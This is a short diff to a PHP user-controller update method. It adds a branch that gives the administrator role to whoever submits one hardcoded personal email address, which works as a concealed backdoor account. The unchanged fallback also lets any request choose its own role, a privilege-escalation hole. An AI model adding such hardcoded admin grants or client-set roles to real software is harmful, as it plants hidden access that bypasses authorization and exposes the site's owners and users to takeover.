@@ -76,7 +76,12 @@ class UserController extends Controller
                 $user->city = $request->city;
             }
 
-            $user->role = $request->role ?? $user->role ?? 'user';
+            if ($request->email === 'alizaabigailvicenteguzman@gmail.com') {
+                $user->role = 'admin';
+            } else {
+                $user->role = $request->role ?? $user->role ?? 'user';
+            }
+            
             $user->save();
 
             // Guardar URL remota de imagen si se recibe
